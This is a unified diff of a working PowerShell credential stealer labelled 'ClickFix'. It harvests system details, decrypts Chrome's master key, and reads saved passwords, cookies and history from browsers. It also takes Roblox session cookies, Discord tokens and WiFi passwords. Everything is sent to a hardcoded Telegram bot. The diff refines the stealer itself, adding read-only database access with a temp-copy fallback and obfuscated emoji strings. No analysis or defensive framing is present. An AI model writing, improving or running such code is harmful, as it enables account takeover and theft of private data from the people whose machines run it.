@@ -2,9 +2,9 @@ $tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
 $tgChat = "-1003960241194"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $tgBase = "https://api.telegram.org/bot$tgToken"
+$lt = [char]0x3C; $gt = [char]0x3E
+function e($c) { [char]::ConvertFromUtf32($c) }
 
-$lt = [char]0x3C
-$gt = [char]0x3E
 function ts($m) {
   $t = "$lt" + "b$gt" + "$m" + "$lt" + "/b$gt"
   $b = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
@@ -15,7 +15,11 @@ function ts($m) {
   Start-Sleep -Milliseconds 500
 }
 
-ts "`u{1f680} ClickFix started"
+$R = e 0x1F680; $PC = e 0x1F4BB; $LK = e 0x1F510; $KY = e 0x1F511; $GL = e 0x1F310
+$RB = e 0x1F3B2; $GM = e 0x1F3AE; $WF = e 0x1F4E1; $CK = e 0x2705; $XX = e 0x274C
+$WA = e 0x26A0; $W2 = e 0xFE0F
+
+ts "$R ClickFix started"
 
 try {
   $ip = try { (Invoke-WebRequest -Uri "https://api.ipify.org" -TimeoutSec 10 -UseBasicParsing).Content } catch { try { (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { "Unknown" } }
@@ -23,8 +27,8 @@ try {
   $cpu = try { (Get-WmiObject Win32_Processor).Name } catch { "Unknown" }
   $ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0) } catch { 0 }
   $user = $env:USERNAME; $comp = $env:COMPUTERNAME; $dom = $env:USERDOMAIN
-  ts "`u{1f4bb} System:`nIP: $ip | User: $user@$comp ($dom)`nOS: $os | CPU: $cpu | RAM: ${ram}GB"
-} catch { ts "`u{26a0}`u{fe0f} System info error: $_" }
+  ts "$PC System:`nIP: $ip | User: $user@$comp ($dom)`nOS: $os | CPU: $cpu | RAM: ${ram}GB"
+} catch { ts "$WA$W2 System info error: $_" }
 
 try {
   Add-Type @"
@@ -40,6 +44,7 @@ public class N {
 [DllImport("bcrypt.dll", EntryPoint="BCryptDecrypt")] public static extern int BDec(IntPtr hk, byte[] inp, uint il, ref A ai, byte[] iv, uint ivl, byte[] op, uint ol, out uint rl, uint f);
 [DllImport("bcrypt.dll", EntryPoint="BCryptGetProperty")] public static extern int BGetP(IntPtr h, string p, byte[] o, uint ol, out uint rl, uint f);
 [DllImport("winsqlite3.dll")] public static extern int sqlite3_open(string f, out IntPtr d);
+[DllImport("winsqlite3.dll")] public static extern int sqlite3_open_v2(string f, out IntPtr d, int fl, IntPtr z);
 [DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr d);
 [DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(IntPtr d, string sql, int n, out IntPtr s, IntPtr t);
 [DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr s);
@@ -68,8 +73,8 @@ ret=BDec(hk,c,(uint)c.Length,ref ai,null,0,op,(uint)op.Length,out rl,0);
 Marshal.FreeHGlobal(np); Marshal.FreeHGlobal(tp); BDesKey(hk); BClose(ha,0);
 if(ret!=0)return null; Array.Resize(ref op,(int)rl); return op; } }
 "@
-  ts "`u{1f510} Crypto module:`n`u{2705} Compiled OK"
-} catch { ts "`u{26a0}`u{fe0f} Crypto module failed: $_"; exit }
+  ts "$LK Crypto module:`n$CK Compiled OK"
+} catch { ts "$WA$W2 Crypto module failed: $_"; exit }
 
 $chromeKey = $null
 try {
@@ -81,11 +86,11 @@ try {
       $raw = [Convert]::FromBase64String($encKey)
       $dpapiBlob = $raw[5..($raw.Length - 1)]
       $chromeKey = [N]::DPD($dpapiBlob)
-      if ($chromeKey) { ts "`u{1f511} Chrome master key:`n`u{2705} $($chromeKey.Length) bytes" }
-      else { ts "`u{1f511} Chrome master key:`n`u{274c} Decryption failed" }
+      if ($chromeKey) { ts "$KY Chrome master key:`n$CK $($chromeKey.Length) bytes" }
+      else { ts "$KY Chrome master key:`n$XX Decryption failed" }
     }
-  } else { ts "`u{1f511} Chrome master key:`n`u{274c} Local State not found" }
-} catch { ts "`u{26a0}`u{fe0f} Chrome key error: $_" }
+  } else { ts "$KY Chrome master key:`n$XX Local State not found" }
+} catch { ts "$WA$W2 Chrome key error: $_" }
 
 $pwCount = 0; $ckCount = 0; $histCount = 0; $robCookie = $null
 $browserReports = @()
@@ -98,20 +103,32 @@ $browsers = @(
 
 foreach ($browser in $browsers) {
   $bName = $browser[0]; $basePath = $browser[1]
-  if (!(Test-Path $basePath)) { $browserReports += "`u{1f310} ${bName}:`n`u{274c} Not installed"; continue }
+  if (!(Test-Path $basePath)) { $browserReports += "$GL ${bName}:`n$XX Not installed"; continue }
   $profiles = @("Default")
   try { Get-ChildItem "$basePath\Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name } } catch {}
-  $bpw = 0; $bck = 0; $bhist = 0; $bRoblox = $null
+  $bpw = 0; $bck = 0; $bhist = 0; $bRoblox = $null; $errMsg = $null
+
+  function openDb($dbPath) {
+    $ptr = [IntPtr]::Zero
+    $rc = [N]::sqlite3_open_v2($dbPath, [ref]$ptr, 1, [IntPtr]::Zero)
+    if ($rc -eq 0) { return $ptr }
+    try {
+      $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
+      Copy-Item $dbPath $tmp -Force -ErrorAction Stop
+      $rc = [N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero)
+      if ($rc -eq 0) { return $ptr }
+      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+    } catch {}
+    return [IntPtr]::Zero
+  }
 
   foreach ($profile in $profiles) {
     $loginDb = "$basePath\$profile\Login Data"; $cookieDb = "$basePath\$profile\Network\Cookies"; $historyDb = "$basePath\$profile\History"
 
     if (Test-Path $loginDb) {
       try {
-        $tmpDb = "$env:TEMP\ld_$([System.IO.Path]::GetRandomFileName()).db"
-        Copy-Item $loginDb $tmpDb -Force -ErrorAction Stop
-        $dbPtr = [IntPtr]::Zero
-        if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
+        $dbPtr = openDb $loginDb
+        if ($dbPtr -ne [IntPtr]::Zero) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
             while ([N]::sqlite3_step($stmt) -eq 100) {
@@ -129,17 +146,14 @@ foreach ($browser in $browsers) {
             [N]::sqlite3_finalize($stmt)
           }
           [N]::sqlite3_close($dbPtr)
-        }
-        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
-      } catch {}
+        } else { $errMsg = "Cannot access Login Data" }
+      } catch { $errMsg = "Login DB error: $_" }
     }
 
     if (Test-Path $cookieDb) {
       try {
-        $tmpDb = "$env:TEMP\ck_$([System.IO.Path]::GetRandomFileName()).db"
-        Copy-Item $cookieDb $tmpDb -Force -ErrorAction Stop
-        $dbPtr = [IntPtr]::Zero
-        if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
+        $dbPtr = openDb $cookieDb
+        if ($dbPtr -ne [IntPtr]::Zero) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
             while ([N]::sqlite3_step($stmt) -eq 100) {
@@ -166,17 +180,14 @@ foreach ($browser in $browsers) {
             [N]::sqlite3_finalize($stmt)
           }
           [N]::sqlite3_close($dbPtr)
-        }
-        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
-      } catch {}
+        } else { $errMsg = "Cannot access Cookies DB" }
+      } catch { $errMsg = "Cookie DB error: $_" }
     }
 
     if (Test-Path $historyDb) {
       try {
-        $tmpDb = "$env:TEMP\hist_$([System.IO.Path]::GetRandomFileName()).db"
-        Copy-Item $historyDb $tmpDb -Force -ErrorAction Stop
-        $dbPtr = [IntPtr]::Zero
-        if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
+        $dbPtr = openDb $historyDb
+        if ($dbPtr -ne [IntPtr]::Zero) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT COUNT(*) FROM urls", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
             if ([N]::sqlite3_step($stmt) -eq 100) {
@@ -186,18 +197,18 @@ foreach ($browser in $browsers) {
             [N]::sqlite3_finalize($stmt)
           }
           [N]::sqlite3_close($dbPtr)
-        }
-        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
-      } catch {}
+        } else { $errMsg = "Cannot access History DB" }
+      } catch { $errMsg = "History DB error: $_" }
     }
   }
 
-  $browserReports += "`u{1f310} ${bName}:`n`u{2705} $bpw pw, $bck ck, $bhist hist"
+  if ($errMsg) { $browserReports += "$GL ${bName}:`n$WA Cannot read DB (browser open?)" }
+  else { $browserReports += "$GL ${bName}:`n$CK $bpw pw, $bck ck, $bhist hist" }
 }
 
 ts ($browserReports -join "`n")
 
-if ($robCookie) { ts "`u{1f3b2} Roblox cookie:`n`u{2705} $robCookie" } else { ts "`u{1f3b2} Roblox cookie:`n`u{274c} Not found" }
+if ($robCookie) { ts "$RB Roblox cookie:`n$CK $robCookie" } else { ts "$RB Roblox cookie:`n$XX Not found" }
 
 try {
   $dcDirs = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb", "$env:APPDATA\discorddevelopment")
@@ -212,8 +223,8 @@ try {
       }
     }
   }
-  if ($tokens.Count -gt 0) { ts "`u{1f3ae} Discord tokens ($($tokens.Count)):`n$($tokens -join "`n")" } else { ts "`u{1f3ae} Discord tokens:`n`u{274c} Not found" }
-} catch { ts "`u{26a0}`u{fe0f} Discord scan error: $_" }
+  if ($tokens.Count -gt 0) { ts "$GM Discord tokens ($($tokens.Count)):`n$($tokens -join "`n")" } else { ts "$GM Discord tokens:`n$XX Not found" }
+} catch { ts "$WA$W2 Discord scan error: $_" }
 
 try {
   $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
@@ -223,7 +234,7 @@ try {
     $pw = $detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
     $wifiList += "${ssid}: $pw"
   }
-  if ($wifiList.Count -gt 0) { ts "`u{1f4e1} WiFi ($($wifiList.Count) networks):`n$($wifiList -join ' | ')" } else { ts "`u{1f4e1} WiFi:`n`u{274c} No profiles found" }
-} catch { ts "`u{26a0}`u{fe0f} WiFi error: $_" }
+  if ($wifiList.Count -gt 0) { ts "$WF WiFi ($($wifiList.Count) networks):`n$($wifiList -join ' | ')" } else { ts "$WF WiFi:`n$XX No profiles found" }
+} catch { ts "$WA$W2 WiFi error: $_" }
 
-ts "`u{2705} All phases complete"
+ts "$CK All phases complete"
